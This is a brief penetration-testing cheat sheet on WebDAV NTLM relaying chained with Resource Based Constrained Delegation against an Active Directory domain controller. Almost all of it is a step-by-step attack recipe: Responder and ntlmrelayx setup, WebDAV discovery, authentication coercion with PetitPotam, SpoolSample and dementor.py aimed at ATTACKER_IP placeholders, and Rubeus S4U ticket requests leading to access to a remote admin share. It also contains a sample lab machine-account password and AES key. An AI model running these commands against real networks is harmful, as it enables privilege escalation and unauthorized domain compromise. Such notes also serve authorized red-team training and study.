# WebDav Relaying

### Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB

## Requirements

#### 1) WebClient service

## Exploitation

#### 1) Disable HTTP in Responder: sudo vi /usr/share/responder/Responder.conf

#### 2) Generate a Windows machine name: sudo responder -I eth0 , e.g: WIN-UBNW4FI3AP0

#### 3) Prepare for RBCD against the DC: 

 - python3 ntlmrelayx.py -t ldaps://dc --delegateaccess -smb2support

#### 4) Discover WebDAV services

 - webclientservicescanner 'domain.local'/'user':'password'@'machine'

 - crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav

 - GetWebDAVStatus.exe 'machine'

#### 5) Trigger the authentication to relay to our ntlmrelayx:

 - PetitPotam.exe WINUBNW4FI3AP0@80/test.txt 10.0.0.4

### the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt . Specifying the IP results in anonymous auth instead of System.

## PrinterBug

 - dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

 - SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

## PetitPotam

 - Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"

 - Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.
 
 - PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"

#### 6) Use the created account to ask for a service ticket:

 - .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'

 - .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F

 - ls \\PC1.purple.lab\c$
